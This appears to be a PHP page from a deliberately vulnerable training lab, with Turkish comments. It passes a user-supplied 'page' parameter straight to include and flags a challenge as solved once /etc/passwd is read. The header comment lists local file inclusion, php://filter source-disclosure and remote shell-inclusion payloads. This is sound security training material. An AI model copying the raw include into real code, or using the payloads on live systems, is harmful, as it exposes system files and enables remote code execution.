<?php
/**
 * LFI/RFI — LOW
 * KASITLI ZAFİYET: kullanıcı kontrollü yol doğrudan include edilir.
 * LFI:  ?page=/etc/passwd
 * Kaynak oku:  ?page=php://filter/convert.base64-encode/resource=index.php
 * RFI:  ?page=http://SUNUCU/shell.txt   (allow_url_include=On)
 */
$page = $_GET['page'] ?? 'pages/home.php';

echo '<p>Sayfalar: <a href="?page=pages/home.php">home</a> · <a href="?page=pages/about.php">about</a></p>';
echo '<form method="get">page: <input type="text" name="page" value="' . e($page) . '" size="50"> <button type="submit">Yükle</button></form>';

ids_log('lfi', $page);
echo '<div class="result">';
ob_start();
// ----- ZAFİYETLİ: ham include -----
include $page;
// ----------------------------------
$included = ob_get_clean();
echo $included === '' ? '(boş)' : $included;
echo '</div>';

if (preg_match('/root:.*:0:0:/', $included)) {
    mark_solved('lfi');
    echo '<div class="result">✅ Keyfi dosya dahil edildi (LFI) — challenge çözüldü!</div>';
}
